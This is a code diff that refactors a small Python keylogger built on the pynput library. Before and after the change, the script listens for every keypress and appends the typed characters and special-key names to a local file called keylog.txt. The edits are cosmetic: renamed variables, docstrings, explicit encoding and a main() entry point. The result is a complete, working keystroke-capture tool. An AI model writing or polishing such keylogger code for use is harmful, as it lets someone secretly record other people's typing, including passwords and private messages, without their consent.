@@ -1,25 +1,32 @@
 from pynput import keyboard
 
-#Log file path
-log_file = "keylog.txt"
+LOG_FILE = "keylog.txt"
 
-#Function to write keys to file
+
 def write_to_file(key):
-    with open(log_file, "a") as f:
+    """Write a captured key to the local log file."""
+    with open(LOG_FILE, "a", encoding="utf-8") as log_file:
         try:
-            f.write(key.char)
+            log_file.write(key.char)
         except AttributeError:
-            if key == key.space:
-                f.write(" ")
-            elif key == key.enter:
-                f.write("\n")
+            if key == keyboard.Key.space:
+                log_file.write(" ")
+            elif key == keyboard.Key.enter:
+                log_file.write("\n")
             else:
-                f.write(f"[{str(key)}] ")
+                log_file.write(f"[{key}] ")
 
-#Listener function
+
 def on_press(key):
+    """Handle a keyboard event by writing it to the log file."""
     write_to_file(key)
 
-#Start listening
-with keyboard.Listener(on_press=on_press) as listener:
-    listener.join()
+
+def main():
+    """Start the keyboard listener and wait for captured input."""
+    with keyboard.Listener(on_press=on_press) as listener:
+        listener.join()
+
+
+if __name__ == "__main__":
+    main()
